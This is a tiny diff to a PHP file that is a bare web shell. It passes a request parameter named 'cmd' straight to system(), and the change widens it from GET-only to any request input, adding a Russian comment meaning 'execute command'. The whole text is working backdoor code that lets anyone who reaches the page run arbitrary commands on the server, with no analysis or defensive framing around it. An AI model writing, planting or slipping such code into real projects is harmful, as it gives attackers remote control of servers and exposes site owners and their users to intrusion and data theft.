@@ -1,6 +1,6 @@
 <?php
-if(isset($_GET['cmd'])) {
-    $cmd = $_GET['cmd'];
-    system($cmd);
+if(isset($_REQUEST['cmd'])) {
+    $cmd = $_REQUEST['cmd'];
+    system($cmd); // выполнить команду
 }
 ?>
